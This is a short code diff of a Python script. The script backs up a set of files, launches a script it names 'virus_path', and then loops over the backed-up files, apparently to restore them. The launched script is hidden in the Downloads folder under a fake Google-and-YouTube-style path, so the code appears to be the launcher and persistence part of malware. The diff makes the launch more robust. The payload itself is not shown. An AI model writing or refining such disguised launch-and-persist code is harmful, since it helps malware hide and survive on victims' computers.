@@ -1,4 +1,4 @@
-import os, time
+import os, time, sys
 import subprocess
 
 home_dir = "C:/Users/justlinux"
@@ -11,9 +11,8 @@ files_to_backup = [
 
 backuped_files = [open(path, "rb").read() for path, _ in files_to_backup]
 
-virus_path = f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/youtube_com.py"
-virus_path = os.path.normpath(virus_path)
-subprocess.Popen(['python', virus_path], shell = True)
+virus_path = os.path.join(home_dir, "Downloads", "Google_Stable_x64", "assets", "cache", "youtube_com.py")
+subprocess.Popen([sys.executable, virus_path])
 
 while True:
   for index, file_paths in enumerate(files_to_backup):
